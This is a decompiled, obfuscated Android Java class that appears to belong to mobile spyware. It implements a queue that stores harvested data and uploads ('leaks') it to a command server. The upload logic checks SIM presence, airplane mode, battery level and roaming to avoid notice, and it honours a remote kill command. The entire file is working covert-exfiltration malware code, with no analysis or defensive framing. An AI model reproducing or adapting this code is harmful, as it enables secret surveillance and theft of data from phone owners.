package com.network.android;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import com.network.android.a.c;
import com.network.android.b.a;
import com.network.android.monitor.observer.BatteryReceiver;
import com.network.b.b;
import java.util.Vector;

public final class j {

    /* renamed from: a  reason: collision with root package name */
    static final Object f81a = new Object();
    public static boolean b = true;
    public static boolean c = true;
    private static Vector d = new Vector();
    private static boolean e = false;
    private static boolean f = false;
    private static Handler g;
    private static a h = null;
    private static Handler i;

    static {
        HandlerThread handlerThread = new HandlerThread("DataQueueThread");
        handlerThread.start();
        g = new Handler(handlerThread.getLooper());
        HandlerThread handlerThread2 = new HandlerThread("DataQueueSavingThread");
        handlerThread2.start();
        i = new Handler(handlerThread2.getLooper());
    }

    public static Handler a() {
        return g;
    }

    public static void a(Context context) {
        com.network.android.c.a.a.a("DataQueue sendDb post");
        if (!Boolean.valueOf(g.post(new l(context))).booleanValue()) {
            com.network.android.c.a.a.a("DataQueue sendDb faild to post");
        }
    }

    public static void a(Context context, String str, String[] strArr, byte[][] bArr) {
        com.network.android.c.a.a.a("DataQueue sendToServer post");
        i.post(new k(str, strArr, bArr, context));
    }

    public static void a(i iVar, Context context) {
        try {
            com.network.android.c.a.a.a("DataQueue addDataDb");
            g(context).a(iVar);
        } catch (Exception e2) {
            com.network.android.c.a.a.a("addData: " + e2.getMessage(), e2);
        }
    }

    public static void a(String str, Context context) {
        try {
            com.network.android.c.a.a.a("DataQueue addDataDb");
            g(context).a(new i(str));
        } catch (Exception e2) {
            com.network.android.c.a.a.a("addData: " + e2.getMessage(), e2);
        }
    }

    public static void a(String str, String[] strArr, byte[][] bArr, Context context) {
        try {
            com.network.android.c.a.a.a("DataQueue addData");
            g(context).a(new i(str, strArr, bArr));
        } catch (Exception e2) {
            com.network.android.c.a.a.a("addData: " + e2.getMessage(), e2);
        }
    }

    public static boolean a(Context context, boolean z, boolean z2) {
        boolean a2;
        short s;
        try {
            com.network.android.c.a.a.a("DataQueue canSend");
            if (!z2 || !com.network.h.j.a()) {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
                if (telephonyManager.getSimSerialNumber() == null && !b.C.booleanValue()) {
                    if (z) {
                        com.network.android.c.a.b.a(1, 7, "LOG_SIM_NOT_FOUND");
                    } else {
                        com.network.android.c.a.a.a("canSend. not allowed to leak, LOG_SIM_FOUND");
                    }
                    if (f(context)) {
                        if (z) {
                            com.network.android.c.a.b.a(1, 36, "LOG_AIRPLANE_MOD");
                        } else {
                            com.network.android.c.a.a.a("canSend. not allowed to leak,LOG_AIRPLANE_MOD");
                        }
                    }
                }
                if (!z2) {
                    a2 = BatteryReceiver.a(10);
                    s = 96;
                } else {
                    a2 = BatteryReceiver.a(5);
                    s = 37;
                }
                if (!a(context, z, a2, s)) {
                    com.network.android.c.a.a.a("DataQueue can't send - low battary");
                    return false;
                }
                ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                if (activeNetworkInfo == null || !activeNetworkInfo.isConnectedOrConnecting()) {
                    com.network.android.c.a.a.a("canSend. not allowed to leak, LOG_INTERNET_CONNECTION_FAILED");
                    if (z) {
                        com.network.android.c.a.b.a(1, 32, "LOG_INTERNET_CONNECTION_FAILED");
                    }
                    if (f(context)) {
                        if (z) {
                            com.network.android.c.a.b.a(1, 36, "LOG_AIRPLANE_MOD");
                        } else {
                            com.network.android.c.a.a.a("LOG_AIRPLANE_MOD");
                        }
                    }
                    return false;
                }
                if (!a(telephonyManager, context, z, connectivityManager)) {
                    return false;
                }
                return true;
            }
            com.network.android.c.a.a.a("canSend. not allowed to leak, on upgrade mode");
            return false;
        } catch (Throwable th) {
            com.network.android.c.a.a.a("DataQueue  canSend: " + th.getMessage(), th);
        }
    }

    public static boolean a(Context context, boolean z, boolean z2, short s) {
        if (z2) {
            if (z) {
                com.network.android.c.a.b.a(1, s, "LOG_SENDING_FAILED_LOW_BATTERY");
            } else {
                com.network.android.c.a.a.a("canSend. not allowed to leak, LOG_SENDING_FAILED_LOW_BATTERY");
            }
            if (!b) {
                return false;
            }
            b = false;
            c.a(context, com.network.android.c.a.b.a((short) 37));
            return false;
        }
        b = true;
        return true;
    }

    public static boolean a(TelephonyManager telephonyManager) {
        boolean z = telephonyManager.isNetworkRoaming() || AndroidCallDirectWatcher.a();
        com.network.android.c.a.a.a("DataQueue  isNetworkRoaming: " + z);
        return z;
    }

    public static boolean a(TelephonyManager telephonyManager, Context context, boolean z, ConnectivityManager connectivityManager) {
        try {
            com.network.android.c.a.a.a("DataQueue isLeakAllowedAccordingToRoaming start");
            if (a(telephonyManager)) {
                com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming Roming!!! NetworkOperator: " + telephonyManager.getNetworkOperator());
                byte[] a2 = com.network.android.c.a.b.a((short) 35);
                if (c) {
                    NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                    if (activeNetworkInfo == null || !activeNetworkInfo.isConnectedOrConnecting()) {
                        com.network.android.c.a.b.a(1, 32, "LOG_INTERNET_CONNECTION_FAILED");
                    } else {
                        c = false;
                        c.a(context, a2);
                    }
                }
                if (!b.d()) {
                    if (z) {
                        com.network.android.c.a.b.a(1, 35, "");
                    }
                    com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming isAllowRoaming. not allowed to leak, LOG_DEVICE_IS_ROAMING");
                    return false;
                }
                int y = b.y();
                com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming allowRomingType: " + y);
                NetworkInfo[] allNetworkInfo = connectivityManager.getAllNetworkInfo();
                boolean z2 = false;
                boolean z3 = false;
                for (NetworkInfo networkInfo : allNetworkInfo) {
                    com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming NetworkInfo: " + networkInfo.getTypeName() + ", connected: " + networkInfo.isConnected());
                    if (networkInfo.getTypeName().equalsIgnoreCase("WIFI") && networkInfo.isConnected()) {
                        z3 = true;
                    }
                    if (networkInfo.getTypeName().equalsIgnoreCase("MOBILE") && networkInfo.isConnected()) {
                        z2 = true;
                    }
                }
                switch (y) {
                    case 1:
                        com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming haveConnectedWifi: " + z3);
                        z2 = z3;
                        break;
                    case 2:
                        com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming haveConnectedMobile: " + z2);
                        break;
                    case 3:
                        z2 = true;
                        break;
                    default:
                        z2 = false;
                        break;
                }
                com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming Allow Roming: " + z2);
                return z2;
            }
            c = true;
            return true;
        } catch (Throwable th) {
            com.network.android.c.a.a.a("isLeakAllowedAccordingToRoaming isAllowRoaming: " + th.getMessage(), th);
            return true;
        }
    }

    public static void b(Context context) {
        int i2;
        com.network.android.c.a.a.a("DataQueue sendAllDb");
        try {
            if (g.a()) {
                com.network.android.c.a.a.a("sendAllDb data is in sending proccess - Return");
                return;
            }
            int i3 = 0;
            while (true) {
                i2 = i3;
                if (!c(context)) {
                    break;
                }
                i3 = i2 + 1;
                try {
                    com.network.android.c.a.a.a("sendAllDb " + i3);
                    a g2 = g(context);
                    i c2 = g2.c();
                    if (c2 != null) {
                        new g();
                        x xVar = new x(context);
                        g.a(SmsReceiver.c(context), c2.a(), xVar, c2.c(), c2.d(), context, null);
                        if (xVar.f132a != 0) {
                            if (xVar.f132a != 50) {
                                if (xVar.f132a != 100) {
                                    com.network.android.c.a.a.b("sendAllDb Fail to send data: " + b.k + " return code: " + xVar.f132a);
                                    b.k++;
                                    i2 = i3;
                                    break;
                                }
                                com.network.android.c.a.a.a("sendAllDb Server Fail on proccesing data: " + xVar.b);
                                g2.b(c2);
                            } else {
                                com.network.android.c.a.a.a("sendAllDb Got kill replay from the server !!!!!: " + xVar.b + " return code: " + xVar.f132a);
                                c.a(context);
                                i2 = i3;
                                break;
                            }
                        } else {
                            com.network.android.c.a.a.a("sendAllDb - Succes in send data");
                            g2.b(c2);
                            b.c(context);
                        }
                    } else {
                        com.network.android.c.a.a.a("dataElement == null !!!!! " + i3);
                        if (!g2.b()) {
                            i2 = i3;
                            break;
                        }
                    }
                } catch (Throwable th) {
                    com.network.android.c.a.a.a("sendAllDb iteraction: " + th.getMessage(), th);
                }
            }
            com.network.android.c.a.a.a("sendAllDb loop Finish " + i2);
            com.network.android.c.a.a.a("sendAllDb end");
        } catch (Throwable th2) {
            com.network.android.c.a.a.a("sendAllDb: " + th2.getMessage(), th2);
            com.network.android.c.a.b.a(1, 2010, "LOG_EXCEPTION_WHILE_HANDLING_DATA_QUEUE");
        }
    }

    public static boolean c(Context context) {
        com.network.android.c.a.a.a("DataQueue shouldSend");
        if (!a(context, true, true)) {
            com.network.android.c.a.a.a("sendAllDb exit cannot send: DataQueue.cantSend!!!!");
            return false;
        } else if (g(context).b()) {
            return true;
        } else {
            com.network.android.c.a.a.a("sendAllDb exit cannot send: no data!!!!");
            return false;
        }
    }

    public static boolean d(Context context) {
        return g(context).b();
    }

    public static boolean e(Context context) {
        try {
            NetworkInfo activeNetworkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
            return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();
        } catch (Throwable th) {
            com.network.android.c.a.a.a("isOnline: " + th.getMessage(), th);
            return true;
        }
    }

    private static boolean f(Context context) {
        return Settings.System.getInt(context.getContentResolver(), "airplane_mode_on", 0) != 0;
    }

    private static a g(Context context) {
        if (h == null) {
            h = new a(context);
        }
        return h;
    }
}
